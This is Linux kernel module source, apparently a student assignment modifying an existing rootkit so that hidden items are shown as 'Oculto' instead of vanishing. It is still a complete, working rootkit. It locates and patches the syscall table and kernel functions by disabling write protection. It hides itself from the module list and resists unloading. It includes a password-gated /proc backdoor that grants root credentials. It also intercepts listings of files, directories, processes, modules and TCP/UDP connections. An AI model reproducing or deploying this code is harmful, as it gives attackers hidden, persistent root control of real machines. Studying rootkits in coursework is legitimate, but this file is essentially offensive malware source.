/*
 * Rootkit Modificado - Tarea 3 - VERSIÓN COMPLETA CON DIRECTORIOS
 * Modifica el comportamiento de ocultamiento para mostrar "Oculto" en lugar de ocultar
 * Incluye: Archivos, Directorios, Procesos, Módulos de Kernel y Conexiones de Red
 * 
 * Basado en el trabajo original de:
 * Copyright (C) 2016-2019 Maxim Biro <nurupo.contributions@gmail.com>
 */

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

struct proc_dir_entry {
    unsigned int low_ino;
    umode_t mode;
    nlink_t nlink;
    kuid_t uid;
    kgid_t gid;
    loff_t size;
    const struct inode_operations *proc_iops;
    const struct file_operations *proc_fops;
    struct proc_dir_entry *parent;
    struct rb_root subdir;
    struct rb_node subdir_node;
    void *data;
    atomic_t count;
    atomic_t in_use;
    struct completion *pde_unload_completion;
    struct list_head pde_openers;
    spinlock_t pde_unload_lock;
    u8 namelen;
    char name[];
};

#endif

#include "config.h"

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Estudiante - Tarea 3 Completa + Directorios");

#define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
    "It should be easy to port to new architectures though"

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

// ========== SYS_CALL_TABLE ==========

#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
#else
    #error ARCH_ERROR_MESSAGE
#endif

void **sys_call_table;

void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < END_ADDRESS) {
        sctable = (void **) i;

        if (sctable[__NR_close] == (void *) sys_close) {
            size_t j;
            const unsigned int SYS_CALL_NUM = 300;
            for (j = 0; j < SYS_CALL_NUM; j ++) {
                if (sctable[j] == NULL) {
                    goto skip;
                }
            }
            return sctable;
        }
skip:
        ;
        i += sizeof(void *);
    }

    return NULL;
}

// ========== HOOK LIST ==========

struct hook {
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

int hook_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;
}

void *hook_get_original(void *modified_function)
{
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list) {
        if (h->modified_function == modified_function) {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}

void hook_remove_all(void)
{
    struct hook *h, *tmp;

    list_for_each_entry(h, &hook_list, list) {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list) {
        list_del(&h->list);
        kfree(h);
    }
}

// ========== ASM HOOK LIST ==========

#if defined __i386__
    #define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
    #define ASM_HOOK_CODE_OFFSET 1
#elif defined __x86_64__
    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    #define ASM_HOOK_CODE_OFFSET 2
#else
    #error ARCH_ERROR_MESSAGE
#endif

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}

void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
    ENABLE_W_PROTECTED_MEMORY
}

void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}

// ========== PID LIST ==========

struct pid_entry {
    unsigned long pid;
    struct list_head list;
};

LIST_HEAD(pid_list);

int pid_add(const char *pid)
{
    struct pid_entry *p = kmalloc(sizeof(struct pid_entry), GFP_KERNEL);

    if (!p) {
        return 0;
    }

    p->pid = simple_strtoul(pid, NULL, 10);
    list_add(&p->list, &pid_list);

    return 1;
}

void pid_remove(const char *pid)
{
    struct pid_entry *p, *tmp;
    unsigned long pid_num = simple_strtoul(pid, NULL, 10);

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        if (p->pid == pid_num) {
            list_del(&p->list);
            kfree(p);
            break;
        }
    }
}

void pid_remove_all(void)
{
    struct pid_entry *p, *tmp;

    list_for_each_entry_safe(p, tmp, &pid_list, list) {
        list_del(&p->list);
        kfree(p);
    }
}

// ========== FILE LIST ==========

struct file_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(file_list);

int file_add(const char *name)
{
    struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);

    if (!f) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    if (name_len -1 > NAME_MAX) {
        kfree(f);
        return 0;
    }

    f->name = kmalloc(name_len, GFP_KERNEL);
    if (!f->name) {
        kfree(f);
        return 0;
    }

    strncpy(f->name, name, name_len);
    list_add(&f->list, &file_list);

    return 1;
}

void file_remove(const char *name)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        if (strcmp(f->name, name) == 0) {
            list_del(&f->list);
            kfree(f->name);
            kfree(f);
            break;
        }
    }
}

void file_remove_all(void)
{
    struct file_entry *f, *tmp;

    list_for_each_entry_safe(f, tmp, &file_list, list) {
        list_del(&f->list);
        kfree(f->name);
        kfree(f);
    }
}

// ========== DIRECTORY LIST - NUEVA FUNCIONALIDAD ==========

struct directory_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(directory_list);

int directory_add(const char *name)
{
    struct directory_entry *d = kmalloc(sizeof(struct directory_entry), GFP_KERNEL);

    if (!d) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    if (name_len - 1 > NAME_MAX) {
        kfree(d);
        return 0;
    }

    d->name = kmalloc(name_len, GFP_KERNEL);
    if (!d->name) {
        kfree(d);
        return 0;
    }

    strncpy(d->name, name, name_len);
    list_add(&d->list, &directory_list);

    return 1;
}

void directory_remove(const char *name)
{
    struct directory_entry *d, *tmp;

    list_for_each_entry_safe(d, tmp, &directory_list, list) {
        if (strcmp(d->name, name) == 0) {
            list_del(&d->list);
            kfree(d->name);
            kfree(d);
            break;
        }
    }
}

void directory_remove_all(void)
{
    struct directory_entry *d, *tmp;

    list_for_each_entry_safe(d, tmp, &directory_list, list) {
        list_del(&d->list);
        kfree(d->name);
        kfree(d);
    }
}

// ========== MODULE LIST ==========

struct module_entry {
    char *name;
    struct list_head list;
};

LIST_HEAD(module_list_hidden);

int module_add(const char *name)
{
    struct module_entry *m = kmalloc(sizeof(struct module_entry), GFP_KERNEL);

    if (!m) {
        return 0;
    }

    size_t name_len = strlen(name) + 1;

    if (name_len - 1 > MODULE_NAME_LEN) {
        kfree(m);
        return 0;
    }

    m->name = kmalloc(name_len, GFP_KERNEL);
    if (!m->name) {
        kfree(m);
        return 0;
    }

    strncpy(m->name, name, name_len);
    list_add(&m->list, &module_list_hidden);

    return 1;
}

void module_remove(const char *name)
{
    struct module_entry *m, *tmp;

    list_for_each_entry_safe(m, tmp, &module_list_hidden, list) {
        if (strcmp(m->name, name) == 0) {
            list_del(&m->list);
            kfree(m->name);
            kfree(m);
            break;
        }
    }
}

void module_remove_all(void)
{
    struct module_entry *m, *tmp;

    list_for_each_entry_safe(m, tmp, &module_list_hidden, list) {
        list_del(&m->list);
        kfree(m->name);
        kfree(m);
    }
}

// ========== CONNECTION LIST ==========

struct connection_entry {
    char *local_addr;
    char *remote_addr;
    unsigned int local_port;
    unsigned int remote_port;
    struct list_head list;
};

LIST_HEAD(connection_list);

int connection_add(const char *local_addr, unsigned int local_port, 
                  const char *remote_addr, unsigned int remote_port)
{
    struct connection_entry *c = kmalloc(sizeof(struct connection_entry), GFP_KERNEL);

    if (!c) {
        return 0;
    }

    size_t local_len = strlen(local_addr) + 1;
    size_t remote_len = strlen(remote_addr) + 1;

    c->local_addr = kmalloc(local_len, GFP_KERNEL);
    c->remote_addr = kmalloc(remote_len, GFP_KERNEL);

    if (!c->local_addr || !c->remote_addr) {
        if (c->local_addr) kfree(c->local_addr);
        if (c->remote_addr) kfree(c->remote_addr);
        kfree(c);
        return 0;
    }

    strncpy(c->local_addr, local_addr, local_len);
    strncpy(c->remote_addr, remote_addr, remote_len);
    c->local_port = local_port;
    c->remote_port = remote_port;

    list_add(&c->list, &connection_list);
    return 1;
}

// Función simplificada para ocultar por puerto local solamente
int connection_add_by_port(unsigned int port)
{
    struct connection_entry *c = kmalloc(sizeof(struct connection_entry), GFP_KERNEL);

    if (!c) {
        return 0;
    }

    c->local_addr = NULL;
    c->remote_addr = NULL;
    c->local_port = port;
    c->remote_port = 0;

    list_add(&c->list, &connection_list);
    return 1;
}

void connection_remove_by_port(unsigned int port)
{
    struct connection_entry *c, *tmp;

    list_for_each_entry_safe(c, tmp, &connection_list, list) {
        if (c->local_port == port && !c->local_addr) {
            list_del(&c->list);
            kfree(c);
            break;
        }
    }
}

void connection_remove_all(void)
{
    struct connection_entry *c, *tmp;

    list_for_each_entry_safe(c, tmp, &connection_list, list) {
        list_del(&c->list);
        if (c->local_addr) kfree(c->local_addr);
        if (c->remote_addr) kfree(c->remote_addr);
        kfree(c);
    }
}

// ========== HIDE ==========

struct list_head *module_list;
int is_hidden = 0;

void hide(void)
{
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = 1;
}

void unhide(void)
{
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);
    is_hidden = 0;
}

// ========== PROTECT ==========

int is_protected = 0;

void protect(void)
{
    if (is_protected) {
        return;
    }

    try_module_get(THIS_MODULE);
    is_protected = 1;
}

void unprotect(void)
{
    if (!is_protected) {
        return;
    }

    module_put(THIS_MODULE);
    is_protected = 0;
}

// ========== READDIR - MODIFICACIÓN PRINCIPAL CON DIRECTORIOS ==========

struct file_operations *get_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *) file->f_op;
    filp_close(file, 0);

    return ret;
}

#define FILLDIR_START(NAME) \
    filldir_t original_##NAME##_filldir; \
    \
    static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
    {

#define FILLDIR_END(NAME) \
        return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    #define READDIR(NAME) \
        int NAME##_iterate(struct file *file, struct dir_context *context) \
        { \
            original_##NAME##_filldir = context->actor; \
            *((filldir_t*)&context->actor) = NAME##_filldir; \
            \
            int (*original_iterate)(struct file *, struct dir_context *); \
            original_iterate = asm_hook_unpatch(NAME##_iterate); \
            int ret = original_iterate(file, context); \
            asm_hook_patch(NAME##_iterate); \
            \
            return ret; \
        }

#endif

#define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)

// MODIFICACIÓN: Archivos Y Directorios
READDIR_HOOK_START(root)
    struct file_entry *f;
    struct directory_entry *d;

    // Verificar archivos (código existente)
    list_for_each_entry(f, &file_list, list) {
        if (strcmp(name, f->name) == 0) {
            pr_info("Archivo '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
            return original_root_filldir(context, "Oculto", 6, offset, ino, d_type);
        }
    }

    // NUEVO: Verificar directorios
    if (d_type == DT_DIR) {  // Solo si es un directorio
        list_for_each_entry(d, &directory_list, list) {
            if (strcmp(name, d->name) == 0) {
                pr_info("Directorio '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
                return original_root_filldir(context, "Oculto", 6, offset, ino, d_type);
            }
        }
    }
READDIR_HOOK_END(root)

// MODIFICACIÓN: Para procesos
READDIR_HOOK_START(proc)
    struct pid_entry *p;

    list_for_each_entry(p, &pid_list, list) {
        if (simple_strtoul(name, NULL, 10) == p->pid) {
            pr_info("PID '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
            return original_proc_filldir(context, "Oculto", 6, offset, ino, d_type);
        }
    }
READDIR_HOOK_END(proc)

// MODIFICACIÓN: Para módulos de kernel
READDIR_HOOK_START(sys)
    // Verificar si es el módulo actual (funcionalidad original)
    if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
        pr_info("Módulo '%s' oculto, mostrando como 'Oculto'\n", name);
        return original_sys_filldir(context, "Oculto", 6, offset, ino, d_type);
    }
    
    // Verificar módulos en la lista
    struct module_entry *m;
    list_for_each_entry(m, &module_list_hidden, list) {
        if (strcmp(name, m->name) == 0) {
            pr_info("Módulo '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
            return original_sys_filldir(context, "Oculto", 6, offset, ino, d_type);
        }
    }
READDIR_HOOK_END(sys)

// Para interceptar archivos de conexiones TCP
READDIR_HOOK_START(procnet_tcp)
    char line_buffer[256];
    unsigned int local_port;
    
    if (sscanf(name, "%*s %*X:%X", &local_port) == 1) {
        struct connection_entry *c;
        list_for_each_entry(c, &connection_list, list) {
            if (c->local_port == local_port && !c->local_addr) {
                pr_info("Conexión puerto %u encontrada, mostrando como 'Oculto'\n", local_port);
                snprintf(line_buffer, sizeof(line_buffer), "Oculto: Puerto %u", local_port);
                return original_procnet_tcp_filldir(context, line_buffer, strlen(line_buffer), 
                                                   offset, ino, d_type);
            }
        }
    }
READDIR_HOOK_END(procnet_tcp)

// Para interceptar archivos de conexiones UDP
READDIR_HOOK_START(procnet_udp)
    char line_buffer[256];
    unsigned int local_port;
    
    if (sscanf(name, "%*s %*X:%X", &local_port) == 1) {
        struct connection_entry *c;
        list_for_each_entry(c, &connection_list, list) {
            if (c->local_port == local_port && !c->local_addr) {
                pr_info("Conexión UDP puerto %u encontrada, mostrando como 'Oculto'\n", local_port);
                snprintf(line_buffer, sizeof(line_buffer), "Oculto: Puerto UDP %u", local_port);
                return original_procnet_udp_filldir(context, line_buffer, strlen(line_buffer), 
                                                   offset, ino, d_type);
            }
        }
    }
READDIR_HOOK_END(procnet_udp)

#undef FILLDIR_START
#undef FILLDIR_END
#undef READDIR
#undef READDIR_HOOK_START
#undef READDIR_HOOK_END

// ========== COMMAND EXECUTION - EXTENDIDO CON DIRECTORIOS ==========

int execute_command(const char __user *str, size_t length)
{
    if (length <= sizeof(CFG_PASS) ||
        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0) {
        return 0;
    }

    pr_info("Password check passed\n");

    str += sizeof(CFG_PASS);

    if (strcmp(str, CFG_ROOT) == 0) {
        pr_info("Got root command\n");
        struct cred *creds = prepare_creds();

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;

#endif

        commit_creds(creds);
    } else if (strncmp(str, CFG_HIDE_PID, sizeof(CFG_HIDE_PID) - 1) == 0) {
        pr_info("Got hide pid command - will show as 'Oculto'\n");
        str += sizeof(CFG_HIDE_PID);
        pid_add(str);
    } else if (strncmp(str, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID) - 1) == 0) {
        pr_info("Got unhide pid command\n");
        str += sizeof(CFG_UNHIDE_PID);
        pid_remove(str);
    } else if (strncmp(str, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE) - 1) == 0) {
        pr_info("Got hide file command - will show as 'Oculto'\n");
        str += sizeof(CFG_HIDE_FILE);
        file_add(str);
    } else if (strncmp(str, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE) - 1) == 0) {
        pr_info("Got unhide file command\n");
        str += sizeof(CFG_UNHIDE_FILE);
        file_remove(str);
    } 
    // NUEVOS COMANDOS PARA DIRECTORIOS
    else if (strncmp(str, CFG_HIDE_DIR, sizeof(CFG_HIDE_DIR) - 1) == 0) {
        pr_info("Got hide directory command - will show as 'Oculto'\n");
        str += sizeof(CFG_HIDE_DIR);
        directory_add(str);
    } else if (strncmp(str, CFG_UNHIDE_DIR, sizeof(CFG_UNHIDE_DIR) - 1) == 0) {
        pr_info("Got unhide directory command\n");
        str += sizeof(CFG_UNHIDE_DIR);
        directory_remove(str);
    }
    // COMANDOS PARA MÓDULOS
    else if (strncmp(str, CFG_HIDE_MODULE, sizeof(CFG_HIDE_MODULE) - 1) == 0) {
        pr_info("Got hide module command - will show as 'Oculto'\n");
        str += sizeof(CFG_HIDE_MODULE);
        module_add(str);
    } else if (strncmp(str, CFG_UNHIDE_MODULE, sizeof(CFG_UNHIDE_MODULE) - 1) == 0) {
        pr_info("Got unhide module command\n");
        str += sizeof(CFG_UNHIDE_MODULE);
        module_remove(str);
    }
    // COMANDOS PARA CONEXIONES
    else if (strncmp(str, CFG_HIDE_CONNECTION, sizeof(CFG_HIDE_CONNECTION) - 1) == 0) {
        pr_info("Got hide connection command - will show as 'Oculto'\n");
        str += sizeof(CFG_HIDE_CONNECTION);
        unsigned int port = simple_strtoul(str, NULL, 10);
        connection_add_by_port(port);
    } else if (strncmp(str, CFG_UNHIDE_CONNECTION, sizeof(CFG_UNHIDE_CONNECTION) - 1) == 0) {
        pr_info("Got unhide connection command\n");
        str += sizeof(CFG_UNHIDE_CONNECTION);
        unsigned int port = simple_strtoul(str, NULL, 10);
        connection_remove_by_port(port);
    }
    else if (strcmp(str, CFG_HIDE) == 0) {
        pr_info("Got hide command - module will show as 'Oculto'\n");
        hide();
    } else if (strcmp(str, CFG_UNHIDE) == 0) {
        pr_info("Got unhide command\n");
        unhide();
    } else if (strcmp(str, CFG_PROTECT) == 0) {
        pr_info("Got protect command\n");
        protect();
    } else if (strcmp(str, CFG_UNPROTECT) == 0) {
        pr_info("Got unprotect command\n");
        unprotect();
    } else {
        pr_info("Got unknown command\n");
    }

    return 1;
}

// ========== COMM CHANNEL ==========

static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
{
    if (execute_command(buf_user, count)) {
        return count;
    }

    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
    original_write = asm_hook_unpatch(proc_fops_write);
    ssize_t ret = original_write(file, buf_user, count, p);
    asm_hook_patch(proc_fops_write);

    return ret;
}

static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
{
    execute_command(buf_user, count);

    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
    original_read = asm_hook_unpatch(proc_fops_read);
    ssize_t ret = original_read(file, buf_user, count, p);
    asm_hook_patch(proc_fops_read);

    return ret;
}

int setup_proc_comm_channel(void)
{
    static const struct file_operations proc_file_fops = {0};
    struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
    proc_entry = proc_entry->parent;

    if (strcmp(proc_entry->name, "/proc") != 0) {
        pr_info("Couldn't find \"/proc\" entry\n");
        remove_proc_entry("temporary", NULL);
        return 0;
    }

    remove_proc_entry("temporary", NULL);

    struct file_operations *proc_fops = NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    struct rb_node *entry = rb_first(&proc_entry->subdir);

    while (entry) {
        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);

        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
            goto found;
        }

        entry = rb_next(entry);
    }

#endif

    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);
    return 0;

found:
    ;

    if (proc_fops->write) {
        asm_hook_create(proc_fops->write, proc_fops_write);
    }

    if (proc_fops->read) {
        asm_hook_create(proc_fops->read, proc_fops_read);
    }

    if (!proc_fops->read && !proc_fops->write) {
        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
        return 0;
    }

    return 1;
}

// ========== INITIALIZATION - CON DIRECTORIOS ==========

int init(void)
{
    pr_info("Rootkit Completo + Directorios - Tarea 3 cargado\n");
    pr_info("Funcionalidades: archivos, directorios, procesos, módulos y conexiones\n");
    pr_info("Los elementos 'ocultos' ahora se mostrarán como 'Oculto'\n");
    
    hide();
    protect();

    if (!setup_proc_comm_channel()) {
        pr_info("Failed to set up comm channel\n");
        unprotect();
        unhide();
        return -1;
    }

    pr_info("Comm channel is set up\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)

    // Hooks existentes
    asm_hook_create(get_fop("/")->iterate, root_iterate);
    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
    
    // Hooks para conexiones
    struct file_operations *procnet_tcp_fops = get_fop("/proc/net/tcp");
    if (procnet_tcp_fops && procnet_tcp_fops->iterate) {
        asm_hook_create(procnet_tcp_fops->iterate, procnet_tcp_iterate);
        pr_info("Hooked /proc/net/tcp\n");
    }
    
    struct file_operations *procnet_udp_fops = get_fop("/proc/net/udp");
    if (procnet_udp_fops && procnet_udp_fops->iterate) {
        asm_hook_create(procnet_udp_fops->iterate, procnet_udp_iterate);
        pr_info("Hooked /proc/net/udp\n");
    }

#endif

    return 0;
}

void exit(void)
{
    asm_hook_remove_all();
    hook_remove_all();
    pid_remove_all();
    file_remove_all();
    directory_remove_all();     // NUEVO - para directorios
    module_remove_all();
    connection_remove_all();

    THIS_MODULE->name[0] = 0;

    pr_info("Rootkit Completo + Directorios removido\n");
}

module_init(init);
module_exit(exit);
